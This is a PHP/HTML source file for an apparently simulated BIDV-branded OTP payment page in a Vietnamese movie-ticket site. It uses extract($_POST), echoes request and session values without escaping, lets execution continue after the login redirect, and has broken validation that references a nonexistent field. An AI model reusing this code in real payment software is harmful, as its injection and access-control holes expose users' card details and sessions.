<?php
session_start();
if (!isset($_SESSION['user'])) {
  header('location:login.php');
}
extract($_POST);
?>
<!doctype html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0 minimal-ui" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta http-equiv="cache-control" content="max-age=0" />
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
  <meta http-equiv="pragma" content="no-cache" />

  <title>Thanh toán</title>
  <link href="css/bank.css" rel="stylesheet" type="text/css" />


</head>


<body>

  <div id="mainContainer" class="row large-centered">

    <div class="text-center">
      <h2>THANH TOÁN</h2>
    </div>

    <hr class="divider">
    <dl class="mercDetails">
      <dt>Phương Thức Thanh Toán</dt>
      <dd>BIDV</dd>
      <dt>Đơn Giá</dt>
      <dd>
      <?php echo $_SESSION['amount']; ?>
      <span style="float: right; margin-right: 120px;">VNĐ</span>
      </dd>
      <dt>Thẻ ghi nợ</dt>
      <dd><?php echo  $number; ?></%>
      </dd>
    </dl>
    <hr class="divider">


    <form name="form1" id="form1" method="post" action="complete_payment.php">
      <fieldset class="page2">
        <div class="page-heading">
          <h6 class="form-heading">Xác Thực Thanh Toán</h6>
          <p class="form-subheading">Tin nhắn OTP đã được gửi đến số điện thoại di động kết thúc sau:<strong>134s</strong></p>


        </div>

        <div class="row formInputSection">
          <div class="large-7 columns">
            <label>
            Mã Xác thực(OTP)
              <input type="tel" name="otp" class="form-control optPass" value="" maxlength="6" autocomplete="off" />
            </label>
          </div>
          <div class="large-5 columns">
            <label>&nbsp;</label><button class="expanded button next" onClick="ValidateForm()" style="background-color:green;">Thanh Toán</button>
          </div>
        </div>
        <div class="text-right resendBtn requestOTP"><a class="request-link" href="javascript:void(0)">Gửi lại mã OTP</a></div>
        <p>


          <a class="tryAgain" href="complete_order.jsp">Quay lại</a> để chọn phim
        </p>
      </fieldset>


    </form>
  </div>
  <script src="bank/script/jquery-1.9.1.js"></script>
  <script>
    document.onmousedown = rightclickD;

    function rightclickD(e) {
      e = e || event;
      if (e.button == 2) {
        alert('Chức năng bị vô hiệu hóa...');
        return false;
      }
    }

    function ValidateForm() {
      var regPin = RegExp("^[0-9]{4,6}$");
      if (document.form1.customerpin.value == "" || !document.form1.customerpin.value.match(regPin)) {
        alert("Vui lòng nhập Mật khẩu một lần (OTP) hợp lệ gồm 6 chữ số nhận được trên Số điện thoại di động đã đăng ký của bạn.");
        document.form1.customerpin.focus();
        return false;
      } else {
        document.form1.submit();
      }

    }
  </script>

</body>

</html>